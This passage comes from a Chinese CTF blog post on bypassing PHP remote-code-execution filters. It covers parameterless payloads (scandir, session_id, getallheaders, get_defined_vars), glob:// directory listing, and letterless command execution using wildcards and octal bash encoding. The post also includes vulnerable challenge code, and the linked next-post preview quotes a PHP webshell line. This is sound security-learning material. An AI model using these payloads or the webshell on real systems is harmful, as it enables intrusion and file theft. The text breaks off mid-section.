+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ： 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ： 返回当前元素的键名和键值，并将内部指针向前移动</span><br><span class="line">pos() – 返回数组中的当前单元, 默认取第一个值</span><br></pre></td></tr></table></figure>
+
+<h3 id="函数套用"><a href="#函数套用" class="headerlink" title="函数套用"></a>函数套用</h3><p>我们举个例子</p>
+<p>如果我们想要返回当前目录下的所有文件和目录，就需要用到scandir()函数，但是这个函数需要一个参数<code>$directory</code>去指定要扫描的目录路径。所以我们需要<code>scandir(&#39;.&#39;)</code> 函数调用会扫描当前目录，那么我们怎么去构造这个小数点呢？这里就需要用到能返回小数点的函数localeconv()，localeconv()的数组的第一个就是小数点，然后我们通过current()函数去读取数组的第一个元素，这样就能构造一个小数点，结合这些我们的payload构造就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scandir(current(localeconv()))</span><br></pre></td></tr></table></figure>
+
+<p>然后使用一个输出函数去将结果输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(current(localeconv())))</span><br></pre></td></tr></table></figure>
+
+<p>实操一下</p>
+<p>先看一下localeconv下的数组内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=var_dump(localeconv());</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250307112128383.png" alt="image-20250307112128383"></p>
+<p>可以看到第一个确实是小数点，我们试着返回这个小数点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=var_dump(current(localeconv()));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250307112322248.png" alt="image-20250307112322248"></p>
+<p>能返回小数点，那就试着读取一下当前目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=var_dump(scandir(current(localeconv())))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250307112802088.png" alt="image-20250307112802088"></p>
+<p>能正常返回，但是这里为什么第一个和第二个是小数点呢？因为在文件系统中，<code>.</code> 代表当前目录，<code>..</code> 代表父目录。使用 <code>scandir()</code> 函数扫描目录时，会自动包含这两个目录项</p>
+<p>然后我们这里如果说希望读取到1.php的话，可能需要用指针操作函数进行多次操作例如反转和移动指针</p>
+<p>一些无参数payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="突破函数禁用"><a href="#突破函数禁用" class="headerlink" title="突破函数禁用"></a>突破函数禁用</h3><p>读取目录的函数</p>
+<p>scandir()函数</p>
+<ul>
+<li><strong>功能</strong>：返回指定目录中的文件和目录数组。</li>
+<li><strong>用法</strong>：<code>$files = scandir($directory, $sorting_order);</code></li>
+<li><code>$directory</code> 是你想要扫描的目录的路径。</li>
+<li><code>$sorting_order</code> 是可选的排序顺序，可以是 <code>SCANDIR_SORT_ASCENDING</code>（升序，默认值），<code>SCANDIR_SORT_DESCENDING</code>（降序），<code>SCANDIR_SORT_NONE</code>（不排序）。</li>
+<li>返回值是一个包含目录中所有文件和目录名称的数组（包括 <code>.</code> 和 <code>..</code>），如果失败则返回 <code>false</code>。</li>
+</ul>
+<p><code>readdir()</code>函数</p>
+<ul>
+<li><strong>功能</strong>：从已经打开的目录中读取下一个文件的名称。</li>
+<li><strong>用法</strong>：<code>$filename = readdir($handle);</code></li>
+<li><code>$handle</code> 是之前通过 <code>opendir()</code> 打开的目录句柄。</li>
+<li>返回值是目录中下一个文件的名称（字符串），如果已经读取到目录末尾或出错则返回 <code>false</code>。</li>
+</ul>
+<p><code>opendir()</code>函数</p>
+<ul>
+<li><strong>功能</strong>：打开一个目录句柄，供其他目录函数使用。</li>
+<li><strong>用法</strong>：<code>$handle = opendir($path);</code></li>
+<li><code>$path</code> 是你想要打开的目录的路径。</li>
+<li>返回值是一个目录句柄（resource 类型），如果失败则返回 <code>false</code>。</li>
+</ul>
+<p>print_r()函数替换函数</p>
+<p>highlight_file</p>
+<p>show_source()</p>
+<ul>
+<li>是 PHP 中用于显示 PHP 源代码的一个函数</li>
+</ul>
+<p>var_dump()</p>
+<ul>
+<li><code>var_dump()</code> 提供了比 <code>print_r()</code> 更详细的信息，包括变量的类型和长度（对于字符串）。</li>
+<li>它对于调试非常有用，因为它显示了更多关于变量的内部信息</li>
+</ul>
+<p>var_export()</p>
+<ul>
+<li><code>var_export()</code> 返回或输出关于变量的字符串表示，这个表示可以作为有效的 PHP 代码来执行（如果变量是数组或对象的话，可能会需要一些调整）。</li>
+<li>它对于生成代码示例或配置数据很有用。</li>
+</ul>
+<p>readgzfile()</p>
+<p>是 PHP 中用于读取整个 gzip 压缩文件的内容，并将其作为字符串返回的函数。这个函数不会直接输出文件内容到浏览器或终端，而是将内容存储在变量中供后续使用。</p>
+<p>c&#x3D;require(“&#x2F;flag.txt”);</p>
+<h2 id="glob伪协议查看文件"><a href="#glob伪协议查看文件" class="headerlink" title="glob伪协议查看文件"></a>glob伪协议查看文件</h2><p><code>glob</code> 伪协议是 PHP 中用于匹配文件路径的一种便捷方式。它基于 <strong>glob 模式</strong>（类似于 shell 中的通配符匹配），可以用来查找符合特定模式的文件或目录。</p>
+<p><strong><code>glob</code> 伪协议的基本用法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">glob://&lt;pattern&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>&lt;pattern&gt;</code>**：是一个 glob 模式，用于匹配文件或目录路径。</li>
+<li>支持的 glob 通配符：<ul>
+<li><code>*</code>：匹配任意数量的字符（包括空字符）。</li>
+<li><code>?</code>：匹配单个字符。</li>
+<li><code>[...]</code>：匹配指定范围内的字符（如 <code>[a-z]</code> 匹配小写字母）。</li>
+<li><code>&#123;a,b,c&#125;</code>：匹配多个模式中的一个（如 <code>&#123;jpg,png,gif&#125;</code> 匹配 <code>jpg</code>、<code>png</code> 或 <code>gif</code>）。</li>
+</ul>
+</li>
+</ul>
+<p>用法</p>
+<ul>
+<li>查找当前目录下的所有 <code>.txt</code> 文件</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$files = glob(&quot;*.txt&quot;);</span><br><span class="line">print_r($files);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用 <code>glob</code> 伪协议读取匹配的文件内容</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pattern = &quot;glob://*.txt&quot;; // 匹配当前目录下的所有 .txt 文件</span><br><span class="line">$files = glob($pattern);</span><br><span class="line">echo $file</span><br></pre></td></tr></table></figure>
+
+<p>拿一道ctf的题目讲一下</p>
+<p>web72</p>
+<p>目录文件扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">传入</span><br><span class="line">c= ?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br><span class="line">分解一下</span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);//*创建一个DirectoryIterator对象，遍历根目录*</span><br><span class="line"></span><br><span class="line">foreach($a as $f)//*// 遍历每个条目*</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   echo($f-&gt;__toString().&#x27; &#x27;);//*// 输出条目的名称，并添加一个空格*</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exit(0);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用session进行无参数RCE"><a href="#利用session进行无参数RCE" class="headerlink" title="利用session进行无参数RCE"></a>利用session进行无参数RCE</h3><p>使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p>
+<p> 首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现</p>
+<p>这样的话我们就可以在cookie中设置phpsession为想要读取的文件名，然后payload设置成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">传参readfile(session_id(session_start()));</span><br><span class="line">设置Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用请求头进行无参数RE"><a href="#利用请求头进行无参数RE" class="headerlink" title="利用请求头进行无参数RE"></a>利用请求头进行无参数RE</h3><p>getallheaders()返回当前请求的所有请求头信息，如果我们在请求头中写入恶意代码，然后再将指针指向最后一个请求头让他执行，那么也可以达到一个无参数RCE的效果</p>
+<p>当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="name">end</span>(<span class="name">getallheaders</span>()))<span class="comment">;</span></span><br><span class="line">然后在请求头中加入phpinfo()<span class="comment">;进行测试</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用全局变量进行无参数RCE"><a href="#利用全局变量进行无参数RCE" class="headerlink" title="利用全局变量进行无参数RCE"></a>利用全局变量进行无参数RCE</h3><p>get_defined_vars()可以回显全局变量$_GET、$_POST、$_FILES、$_COOKIE</p>
+<p>返回数组顺序为$_GET–&gt;$_POST–&gt;$_COOKIE–&gt;$_FILES</p>
+<p>假如一个题目中只有一个参数a，我们可以多加一个参数b，然后写入命令执行语句</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>把eval换成assert也行 ，能执行system(‘ls &#x2F;‘)就行</p>
+<h2 id="无字母RCE"><a href="#无字母RCE" class="headerlink" title="无字母RCE"></a>无字母RCE</h2><p>什么是无字母rce呢，题目代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目只是过滤了字母而没过滤数字，这时候又该怎么绕过呢？</p>
+<h3 id="使用-bin目录下的可执行程序"><a href="#使用-bin目录下的可执行程序" class="headerlink" title="使用&#x2F;bin目录下的可执行程序"></a><strong>使用&#x2F;bin目录下的可执行程序</strong></h3><p><strong>base64程序查看flag.php</strong></p>
+<p>尝试使用&#x2F;bin目录下的可执行程序。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/base64 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>但是过滤了字母，那么我们用通配符?绕过，下面会详细讲解</p>
+<p>替换后变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure>
+
+<p>积累题型，最近碰到了一道题，是XYCTF2024的题目，具体代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里给出了白名单，要求我们传入的$cmd参数的每个字符都符合白名单规定的内容，否则就会执行die()语句，这时候我们可以用什么方法呢?</p>
+<p>第一个就是bashfuck</p>
+<h2 id="bashfuck实现无字母RCE"><a href="#bashfuck实现无字母RCE" class="headerlink" title="bashfuck实现无字母RCE"></a>bashfuck实现无字母RCE</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35251017/article/details/129501373">【bashfuck】bashshell实现无字母命令执行的构造原理</a></p>
+<p>其实这里还是有限制的，取决于Linux的系别，在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash</p>
+<h3 id="数字编码执行RCE"><a href="#数字编码执行RCE" class="headerlink" title="数字编码执行RCE"></a>数字编码执行RCE</h3><p>首先我们知道，在终端中，<code>$&#39;\xxx&#39;</code>可以将八进制ascii码解析为字符，所以我们可以尝试通过八进制将我们的命令进行转码去绕过字母或者关键字的限制</p>
+<p>根据<strong>Bash 的 <code>$&#39;...&#39;</code> ANSI-C Quoting 机制</strong>，<code>$&#39;...&#39;</code> 会在 <strong>Shell 解析阶段</strong>（执行命令前）把 <code>\xxx</code>（八进制）转换成 <strong>对应的 ASCII 字符</strong>。所有 <strong><code>$&#39;\xxx&#39;</code> 拼接后</strong>，最终会合并为 <strong>可执行的 Shell 命令</strong></p>
+<p>我们终端测试一下</p>
+<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250403184929665.png" alt="image-20250403184929665"></p>
+<p>\154\163是<code>ls</code>的八进制表示。</p>
+<p>但是注意，如果为连续的一串<code>$&#39;\xxx\xxx\xxx\xxx&#39;</code>形式，则我们无法执行带参数的命令。这是为什么呢？</p>
+<p>Shell 仅将 <code>$&#39;\xxx\xxx...&#39;</code> 视为 <strong>单字符串（一个参数）</strong>，而不是 <strong>可执行命令</strong>，它并不会对参数进行分割，在Bash中，单词分割是一种将参数扩展、命令替换和算术扩展的结果分割成多个单词的过程，它发生在双引号之外，并且受到IFS变量的影响。</p>
+<p>如果一个字符串包含空格或其他IFS字符，它会被分割成多个单词，每个单词作为一个独立的参数传递给命令。</p>
+<p>但因为八进制转义序列是在命令行解析之前就执行的，所以它不会触发单词分割</p>
+<p>然后我们再来关注一下Linux Bash Shell的Here string语法</p>
+<h4 id="Linux-Bash-Shell的Here-string语法"><a href="#Linux-Bash-Shell的Here-string语法" class="headerlink" title="Linux Bash Shell的Here string语法"></a>Linux Bash Shell的Here string语法</h4><p>在 Bash Shell 中，<strong>Here String</strong>（<code>&lt;&lt;&lt;</code>）是一种将 <strong>单行字符串</strong> 标准输入（stdin）传递给命令的方法。</p>
+<p>基本语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command &lt;&lt;&lt; &quot;STRING&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&lt;&lt;&lt;</code>：Here String 操作符</li>
+<li><code>&quot;STRING&quot;</code>：要传递给 <code>command</code> 的输入内容</li>
+</ul>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;&lt; &quot;hello&quot;   # 相当于 echo &quot;hello&quot; | cat</span><br></pre></td></tr></table></figure>
+
+<p>然后我们需要关注另一个点，就是$0变量</p>
+<h4 id="0变量"><a href="#0变量" class="headerlink" title="$0变量"></a>$0变量</h4><p>$0 是一个特殊的变量，表示当前正在执行的脚本(或者是当前的 shell)的文件名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/var/www/html# echo $0</span><br><span class="line">bash</span><br></pre></td></tr></table></figure>
+
+<p>然后是 &lt;&lt;&lt; ，是一种操作符，用于将字符串作为输入传递给命令</p>
+<ul>
+<li><code>&lt;&lt;&lt;</code> 是 <strong>Here String</strong> 语法，可以将字符串直接传递给命令的标准输入（stdin）。</li>
+</ul>
+<p>所以我们试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/var/www/html# $0&lt;&lt;&lt;&#x27;id&#x27;</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>这里的命令就相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;id&#x27; | $0</span><br></pre></td></tr></table></figure>
+
+<p>如果$0是<code>/bin/bash</code>，那么就会尝试执行这个命令</p>
+<p>那我们试着执行命令ls</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$0&lt;&lt;&lt;$%27\154\163\040\057%27</span><br><span class="line">等价于</span><br><span class="line">echo &#x27;ls /&#x27; | /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>bash</code> 读取标准输入时自动解析 <code>\</code> 转义，才会触发命令执行漏洞，其实这里还取决于服务器的shell配置</p>
+<p>但是这里是在终端去进行测试的，在终端中$0其实就是bash本身，但是在环境中我们往往需要寻找如何构造$0，或者说有些题目如果过滤了0，该如何构造0</p>
+<h4 id="构造-0"><a href="#构造-0" class="headerlink" title="构造$0"></a>构造$0</h4><p>我们可以使用变量赋值，或者特殊变量构造</p>
+<ul>
+<li><code>$</code> 来替换 <code>1</code> ，用 &#96;$</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">wanTh3flag</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/03/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/">http://example.com/2025/04/03/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">root@wanth3f1ag</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/RCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">RCE和文件包含</a></div><div class="post-share"><div class="social-share" data-image="/image/8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/03/XYCTF2024%E5%A4%8D%E7%8E%B0/" title="XYCTF2024复现"><img class="cover" src="/image/8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">XYCTF2024复现</div></div><div class="info-2"><div class="info-item-1">ezMake扫了一下目录发现有flag文件，下载下来就是flag，不过好像这不是预期解  传入一个1之后有回显  分析一下内容 这里PATH变量被设置为空，这段 Makefile 的逻辑检查了 PATH 是否未定义，如果未定义则设为空，如果已定义也重设为空。因为**make 命令本身也依赖 PATH 查找**，当PATH被设置为空之后，  但是测试之后发现Bash内置命令是可以执行的 12345ubuntu@VM-16-12-ubuntu:/$ PATH=ubuntu@VM-16-12-ubuntu:/$ echo &quot;1&quot;1ubuntu@VM-16-12-ubuntu:/$ pwd/  尝试用echo写木马但是遇到waf了 1echo &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; &gt; 1.php  用base64和hex绕过也不行 1echo &quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=&quot; | base64 -d &gt;...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">wanTh3flag</div><div class="author-info-description">web低手</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">只会做签到题，签完到就走</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRCE"><span class="toc-text">什么是RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%86%E7%B1%BB-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%92%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4"><span class="toc-text">1.分类(远程代码和远程命令)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-text">RCE漏洞产生的条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E7%BB%95%E8%BF%87bypass%E5%A7%BF%E5%8A%BF"><span class="toc-text">RCE绕过bypass姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%87%BD%E6%95%B0"><span class="toc-text">php执行系统命令函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">绕过关键字黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text">通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">单引号双引号反引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="toc-text">反斜杠绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%88%B0-9%E3%80%81-%E5%92%8C-%E7%BB%95%E8%BF%87"><span class="toc-text">$1到$9、$@和$*绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-text">变量拼接绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8base%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">利用base编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8hex%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">利用hex编码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-text">特殊命令替换绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4cat"><span class="toc-text">读文件命令cat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text">空格的绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 